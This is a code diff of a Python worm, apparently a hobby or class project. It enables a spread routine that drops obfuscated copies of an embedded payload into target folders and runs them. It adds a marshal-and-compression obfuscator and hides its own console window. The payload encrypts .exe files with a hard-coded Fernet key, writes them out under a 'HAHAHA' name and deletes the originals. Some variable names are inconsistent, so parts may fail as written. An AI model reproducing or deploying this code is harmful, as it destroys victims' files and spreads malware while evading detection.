@@ -1,14 +1,10 @@
 import os
 os.system("pip install pypiwin32 pycryptodome cryptography > /dev/null 2>&1")
 import sys
-import time
-import threading
 import shutil
 import win32con
 import win32gui
 import random
-from os import system
-
 
 ROOTDIR = r"C:\\"
 THIS_DIR = os.path.dirname(os.path.realpath(__file__))
@@ -17,7 +13,6 @@ class Worm:
     def __init__(self):
         self.target_dir_list = []
         self.directories_found = False
-        self.own_path = os.path.realpath(__file__) # pode ser usado para apenas não encriptar a diretoria da worm
 
     def find_directories(self):
         for dirpath, dirnames, _ in os.walk(ROOTDIR):
@@ -34,59 +29,96 @@ class Worm:
 
         self.directories_found = True
 
-# C:/Program Files/Windows NT/Accessories -> target_dir_list[30]
     def spread(self):
-        worm_poli = ""
-        times = random.randrange(1, 25)
-        for i in range(times):
-            num = random.randrange(-sys.maxsize, sys.maxsize)
-            worm_poli += "print(" + str(num) + ")\n"
+        to_infect = THIS_DIR + "/tmp/to_infect.py"
+        to_infect_o = THIS_DIR + "/tmp/to_infect_o.py"
 
-        worm_poli += "\n"
-        worm_poli += ENCRYPTOR
+        for target in ["C:\\Users\\w0rmer\\Downloads\\test", "C:\\Users\\w0rmer\\Downloads\\test2"]:
+            worm_poli = ""
+            times = random.randrange(1, 25)
+            for i in range(times):
+                num = random.randrange(-sys.maxsize, sys.maxsize)
+                worm_poli += "print(" + str(num) + ")\n"
 
-        target_list = ["C:/Users/w0rmer/Downloads/test3", "C:/Users/w0rmer/Documents/test", "C:/Users/w0rmer/Music/test2"]
+            worm_poli += "\n"
+            worm_poli += ENCRYPTOR
 
-        for target in target_list:
-            with open(target + "/csgo.py", "w") as f:
-                f.write(worm_poli)
-            system("cd " + target + " && python.exe csgo.py && cd " + THIS_DIR)
-            os.remove(target + "/csgo.py")
+            with open("to_infect.py", "w") as tf:
+                tf.write(encryptor)
 
+            
+            os.system(f"python.exe ./py_fuscate.py -i {to_infect} -o {to_infect_o} -c 100 > /dev/null 2>&1")
+
+            try:
+                with open(target + "/hehe.py", "w") as f:
+                    with open("to_infect_o.py", "r") as fe:
+                        f.write(fe.read())
+                os.system("cd " + target + " && python.exe hehe.py && cd " + THIS_DIR)
+                os.remove(target + "/hehe.py")
+            except PermissionError:
+                pass
 
     def execute_worm(self):
         if not self.directories_found:
             self.find_directories()
 
-        # self.spread()
+        self.spread()
 
 if __name__ == "__main__":
     hide = win32gui.GetForegroundWindow()
     win32gui.ShowWindow(hide, win32con.SW_HIDE)
 
+    FUSCATE = """import os, sys, subprocess, argparse, random, time, marshal, lzma, gzip, bz2, binascii, zlib, requests, tqdm, colorama
+PYTHON_VERSION = 'python' + '.'.join(str(i) for i in sys.version_info[:2])
+def encode(source:str) -> str:
+    selected_mode = random.choice((lzma, gzip, bz2, binascii, zlib))
+    marshal_encoded = marshal.dumps(compile(source, 'Py-Fuscate', 'exec'))
+    if selected_mode is binascii:
+        return 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(binascii.a2b_base64({})))'.format(binascii.b2a_base64(marshal_encoded))
+    return 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads({}.decompress({})))'.format(selected_mode.__name__, selected_mode.compress(marshal_encoded))
+def parse_args():
+    parser = argparse.ArgumentParser(description='obfuscate python programs'.title())
+    parser._optionals.title = "syntax".title()
+    parser.add_argument('-i', '--input', type=str, help='input file name'.title(), required=True)
+    parser.add_argument('-o', '--output', type=str, help='output file name'.title(), required=True)
+    parser.add_argument('-c', '--complexity', type=int,
+                        help='complexity of obfuscation. 100 recomended'.title(), required=True)
+    if len(sys.argv) == 1:
+        parser.print_help()
+        sys.exit()
+    return parser.parse_args()
+def main():
+    args = parse_args()
+    print('\t[+] encoding '.title() + args.input)
+    with tqdm.tqdm(total=args.complexity) as pbar:
+        with open(args.input) as iput:
+            for i in range(args.complexity):
+                if i == 0:
+                    encoded = encode(source=iput.read())
+                else:
+                    encoded = encode(source=encoded)
+                time.sleep(0.1)
+                pbar.update(1)
+    with open(args.output, 'w') as output:
+        output.write(encoded)
+if __name__ == '__main__':
+    main()"""
+
+    with open("py_fuscate.py", "w") as f:
+        f.write(FUSCATE)
+
     ENCRYPTOR = """import os
-import base64
 import sys
-from io import BytesIO
-from Crypto import Random
-from Crypto.Cipher import AES
-
+from cryptography.fernet import Fernet
 THIS_DIR = os.path.dirname(os.path.realpath(__file__))
-
+KEY = b'k6XGrVRO4bCexC54uWlJgKPx9KloztECXpA-LywXDKo='
 def encrypt(data, filename):
-    with open(filename, "rb") as source:
-        key = source.read(24)
-
-    iv = Random.new().read(AES.block_size)
-    cipher = AES.new(key, AES.MODE_CFB, iv)
-    encrypted = iv + cipher.encrypt(data)
-
-    return base64.b64encode(encrypted)
-
+    f = Fernet(KEY)
+    encrypted_data = f.encrypt(data)
+    return encrypted_data
 if __name__ == "__main__":
-    for (dirpath, dirnames, filenames) in os.walk(THIS_DIR):
+    for (_, _, filenames) in os.walk(THIS_DIR):
         break
-        
     for file in filenames:
         if file.endswith(".exe"):
             with open(file, "rb") as f:
@@ -95,8 +127,8 @@ if __name__ == "__main__":
             destination = file + "HAHAHA"
             with open(destination, "wb") as fd:
                 fd.write(encrypt(data, file))
-                fd.close()
             os.remove(file)"""
 
     worm = Worm()
     worm.execute_worm()
+    os.rmdir("tmp")
